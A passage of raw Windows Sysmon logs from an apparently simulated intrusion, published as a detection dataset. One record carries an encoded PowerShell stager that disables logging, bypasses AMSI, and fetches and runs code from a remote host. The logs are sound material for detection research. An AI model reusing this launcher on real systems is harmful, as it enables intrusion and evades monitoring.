AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309564,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:30:12.496","EventTime":"2020-09-04 03:30:12","EventReceivedTime":"2020-09-04 03:30:13","@timestamp":"2020-09-04T07:30:13.761Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:30:12.496\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 1808\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"1808","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309565,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:30:12.496","EventTime":"2020-09-04 03:30:12","EventReceivedTime":"2020-09-04 03:30:13","@timestamp":"2020-09-04T07:30:13.762Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Image loaded:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:30:12.604\r\nProcessGuid: {3ddc5665-e80d-5f51-2501-000000000500}\r\nProcessId: 1376\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nImageLoaded: C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.M870d558a#\\09c72eafc3d2dce2d166e675afc85051\\Microsoft.Management.Infrastructure.Native.ni.dll\r\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\r\nDescription: Microsoft.Management.Infrastructure.Native.dll\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Microsoft.Management.Infrastructure.Native.dll\r\nHashes: SHA1=CB0E1F0F8B8282AC007148BBF246473471745298,MD5=9AFDCDF6B899FAF6C00A1A0658B220E7,SHA256=7D36CC66737C3C592169B13BF4B2BD7E754CD6B41A6EAF3EAA3B91F7D972F138,IMPHASH=00000000000000000000000000000000\r\nSigned: false\r\nSignature: -\r\nSignatureStatus: Unavailable","Product":"Microsoft® Windows® Operating System","Domain":"NT AUTHORITY","ImageLoaded":"C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.M870d558a#\\09c72eafc3d2dce2d166e675afc85051\\Microsoft.Management.Infrastructure.Native.ni.dll","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SignatureStatus":"Unavailable","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":7,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","ProcessId":"1376","ProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Description":"Microsoft.Management.Infrastructure.Native.dll","Hashes":"SHA1=CB0E1F0F8B8282AC007148BBF246473471745298,MD5=9AFDCDF6B899FAF6C00A1A0658B220E7,SHA256=7D36CC66737C3C592169B13BF4B2BD7E754CD6B41A6EAF3EAA3B91F7D972F138,IMPHASH=00000000000000000000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Signature":"-","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","AccountType":"User","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","Company":"Microsoft Corporation","ThreadID":4348,"RecordNumber":309566,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OriginalFileName":"Microsoft.Management.Infrastructure.Native.dll","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Image loaded (rule: ImageLoad)","EventReceivedTime":"2020-09-04 03:30:13","Task":7,"UtcTime":"2020-09-04 07:30:12.604","EventTime":"2020-09-04 03:30:12","@timestamp":"2020-09-04T07:30:13.763Z","tags":["mordorDataset"],"RuleName":"-","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Signed":"false"}
{"Version":3,"Product":"Microsoft (R) Windows (R) Operating System","Domain":"NT AUTHORITY","ImageLoaded":"C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P1706cafe#\\bba021e5569e57d99c3debc3110a3819\\Microsoft.PowerShell.Commands.Diagnostics.ni.dll","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SignatureStatus":"Unavailable","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":7,"FileVersion":"10.0.18362.1","ProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Hashes":"SHA1=B6E00D1A71868BB82FB49E1E8940CB9B35BC73E9,MD5=76BCCEDACD8C5A99D79CA9F53231674B,SHA256=D1B5E9F4A52F690ADE13D86DD6582EE31190D0CE310A01D025687137071B66D5,IMPHASH=00000000000000000000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Signature":"-","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","AccountType":"User","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","Company":"Microsoft Corporation","ThreadID":4344,"RecordNumber":309567,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OriginalFileName":"Microsoft.PowerShell.Commands.Diagnostics.dll","OpcodeValue":0,"host":"wec.internal.cloudapp.net","ERROR_EVT_UNRESOLVED":true,"port":53971,"@version":"1","Category":"Image loaded (rule: ImageLoad)","EventReceivedTime":"2020-09-04 03:30:13","Task":7,"UtcTime":"2020-09-04 07:30:12.651","EventTime":"2020-09-04 03:30:12","@timestamp":"2020-09-04T07:30:13.763Z","tags":["mordorDataset"],"RuleName":"-","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Signed":"false"}
{"Version":3,"Product":"Microsoft (R) Windows (R) Operating System","Domain":"NT AUTHORITY","ImageLoaded":"C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.We0722664#\\fcb1ebfd22b6baa466f9c5be528d7fae\\Microsoft.WSMan.Management.ni.dll","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SignatureStatus":"Unavailable","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":7,"FileVersion":"10.0.18362.1","ProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Hashes":"SHA1=F4614B4FED2B9E9BBF5EFC0D7DA65C34FFAC4465,MD5=E601A05AFB0A8DC5EE3350547A82B548,SHA256=BBAF93E65357A95670A94F868BF31DC418730C9E91FB50A8DCBF960467E4923F,IMPHASH=00000000000000000000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Signature":"-","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","AccountType":"User","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","Company":"Microsoft Corporation","ThreadID":4344,"RecordNumber":309568,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OriginalFileName":"Microsoft.WSMan.Management.dll","OpcodeValue":0,"host":"wec.internal.cloudapp.net","ERROR_EVT_UNRESOLVED":true,"port":53971,"@version":"1","Category":"Image loaded (rule: ImageLoad)","EventReceivedTime":"2020-09-04 03:30:13","Task":7,"UtcTime":"2020-09-04 07:30:12.651","EventTime":"2020-09-04 03:30:12","@timestamp":"2020-09-04T07:30:13.764Z","tags":["mordorDataset"],"RuleName":"-","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Signed":"false"}
{"SourceModuleType":"im_msvistalog","Version":2,"Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-09-04 07:30:12.667\r\nProcessGuid: {3ddc5665-e80d-5f51-2501-000000000500}\r\nProcessId: 1376\r\nImage: C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKU\\S-1-5-21-3125456671-949036322-3048627137-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","AccountType":"User","tags":["mordorDataset"],"Domain":"NT AUTHORITY","Opcode":"Info","UserID":"S-1-5-18","SourceName":"Microsoft-Windows-Sysmon","Hostname":"WORKSTATION5.theshire.local","ThreadID":4344,"EventType":"CreateKey","RecordNumber":309569,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":-9223372036854775808,"Severity":"INFO","OpcodeValue":0,"AccountName":"SYSTEM","host":"wec.internal.cloudapp.net","EventID":12,"ProcessId":"1376","port":53971,"@version":"1","ProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Category":"Registry object added or deleted (rule: RegistryEvent)","EventReceivedTime":"2020-09-04 03:30:13","Task":12,"UtcTime":"2020-09-04 07:30:12.667","EventTime":"2020-09-04 03:30:12","Channel":"Microsoft-Windows-Sysmon/Operational","@timestamp":"2020-09-04T07:30:13.764Z","EventTypeOrignal":"INFO","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"RuleName":"-","Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetObject":"HKU\\S-1-5-21-3125456671-949036322-3048627137-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"}
{"tags":["mordorDataset"],"Version":1,"Message":"Pipe Created:\r\nRuleName: -\r\nEventType: CreatePipe\r\nUtcTime: 2020-09-04 07:30:12.714\r\nProcessGuid: {3ddc5665-e80d-5f51-2501-000000000500}\r\nProcessId: 1376\r\nPipeName: <Anonymous Pipe>\r\nImage: C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","AccountType":"User","Domain":"NT AUTHORITY","Opcode":"Info","UserID":"S-1-5-18","SourceName":"Microsoft-Windows-Sysmon","Hostname":"WORKSTATION5.theshire.local","ThreadID":4344,"EventType":"CreatePipe","RecordNumber":309570,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":-9223372036854775808,"Severity":"INFO","OpcodeValue":0,"AccountName":"SYSTEM","host":"wec.internal.cloudapp.net","EventID":17,"ProcessId":"1376","port":53971,"@version":"1","ProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Category":"Pipe Created (rule: PipeEvent)","EventReceivedTime":"2020-09-04 03:30:13","Task":17,"UtcTime":"2020-09-04 07:30:12.714","EventTime":"2020-09-04 03:30:12","Channel":"Microsoft-Windows-Sysmon/Operational","@timestamp":"2020-09-04T07:30:13.764Z","PipeName":"&lt;Anonymous Pipe&gt;","EventTypeOrignal":"INFO","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"RuleName":"-","Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceModuleType":"im_msvistalog"}
{"tags":["mordorDataset"],"Version":1,"Message":"Pipe Connected:\r\nRuleName: -\r\nEventType: ConnectPipe\r\nUtcTime: 2020-09-04 07:30:12.714\r\nProcessGuid: {3ddc5665-e80d-5f51-2501-000000000500}\r\nProcessId: 1376\r\nPipeName: <Anonymous Pipe>\r\nImage: C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","AccountType":"User","Domain":"NT AUTHORITY","Opcode":"Info","UserID":"S-1-5-18","SourceName":"Microsoft-Windows-Sysmon","Hostname":"WORKSTATION5.theshire.local","ThreadID":4344,"EventType":"ConnectPipe","RecordNumber":309571,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":-9223372036854775808,"Severity":"INFO","OpcodeValue":0,"AccountName":"SYSTEM","host":"wec.internal.cloudapp.net","EventID":18,"ProcessId":"1376","port":53971,"@version":"1","ProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Category":"Pipe Connected (rule: PipeEvent)","EventReceivedTime":"2020-09-04 03:30:13","Task":18,"UtcTime":"2020-09-04 07:30:12.714","EventTime":"2020-09-04 03:30:12","Channel":"Microsoft-Windows-Sysmon/Operational","@timestamp":"2020-09-04T07:30:13.765Z","PipeName":"&lt;Anonymous Pipe&gt;","EventTypeOrignal":"INFO","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"RuleName":"-","Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceModuleType":"im_msvistalog"}
{"tags":["mordorDataset"],"Version":1,"Message":"Pipe Created:\r\nRuleName: -\r\nEventType: CreatePipe\r\nUtcTime: 2020-09-04 07:30:12.714\r\nProcessGuid: {3ddc5665-e80d-5f51-2501-000000000500}\r\nProcessId: 1376\r\nPipeName: <Anonymous Pipe>\r\nImage: C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","AccountType":"User","Domain":"NT AUTHORITY","Opcode":"Info","UserID":"S-1-5-18","SourceName":"Microsoft-Windows-Sysmon","Hostname":"WORKSTATION5.theshire.local","ThreadID":4344,"EventType":"CreatePipe","RecordNumber":309572,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":-9223372036854775808,"Severity":"INFO","OpcodeValue":0,"AccountName":"SYSTEM","host":"wec.internal.cloudapp.net","EventID":17,"ProcessId":"1376","port":53971,"@version":"1","ProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Category":"Pipe Created (rule: PipeEvent)","EventReceivedTime":"2020-09-04 03:30:13","Task":17,"UtcTime":"2020-09-04 07:30:12.714","EventTime":"2020-09-04 03:30:12","Channel":"Microsoft-Windows-Sysmon/Operational","@timestamp":"2020-09-04T07:30:13.765Z","PipeName":"&lt;Anonymous Pipe&gt;","EventTypeOrignal":"INFO","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"RuleName":"-","Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceModuleType":"im_msvistalog"}
{"tags":["mordorDataset"],"Version":1,"Message":"Pipe Connected:\r\nRuleName: -\r\nEventType: ConnectPipe\r\nUtcTime: 2020-09-04 07:30:12.714\r\nProcessGuid: {3ddc5665-e80d-5f51-2501-000000000500}\r\nProcessId: 1376\r\nPipeName: <Anonymous Pipe>\r\nImage: C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","AccountType":"User","Domain":"NT AUTHORITY","Opcode":"Info","UserID":"S-1-5-18","SourceName":"Microsoft-Windows-Sysmon","Hostname":"WORKSTATION5.theshire.local","ThreadID":4344,"EventType":"ConnectPipe","RecordNumber":309573,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":-9223372036854775808,"Severity":"INFO","OpcodeValue":0,"AccountName":"SYSTEM","host":"wec.internal.cloudapp.net","EventID":18,"ProcessId":"1376","port":53971,"@version":"1","ProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Category":"Pipe Connected (rule: PipeEvent)","EventReceivedTime":"2020-09-04 03:30:13","Task":18,"UtcTime":"2020-09-04 07:30:12.714","EventTime":"2020-09-04 03:30:12","Channel":"Microsoft-Windows-Sysmon/Operational","@timestamp":"2020-09-04T07:30:13.765Z","PipeName":"&lt;Anonymous Pipe&gt;","EventTypeOrignal":"INFO","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"RuleName":"-","Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceModuleType":"im_msvistalog"}
{"Version":5,"Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:30:12.728\r\nProcessGuid: {3ddc5665-ed04-5f51-eb02-000000000500}\r\nProcessId: 6692\r\nImage: C:\\Windows\\System32\\whoami.exe\r\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\r\nDescription: whoami - displays logged on user information\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: whoami.exe\r\nCommandLine: \"C:\\windows\\system32\\whoami.exe\" /groups\r\nCurrentDirectory: C:\\windows\\system32\\\r\nUser: THESHIRE\\pgustavo\r\nLogonGuid: {3ddc5665-e7e4-5f51-2d99-0a0000000000}\r\nLogonId: 0xA992D\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA1=8F1F9E265911956C7F8F3861C34DEF9B8FA63813,MD5=2EEEEC89E705F73FFBCAE014E1828788,SHA256=A8A4C4719113B071BB50D67F6E12C188B92C70EEAFDFCD6F5DA69B6AAA99A7FD,IMPHASH=7FF0758B766F747CE57DFAC70743FB88\r\nParentProcessGuid: {3ddc5665-e80d-5f51-2501-000000000500}\r\nParentProcessId: 1376\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFY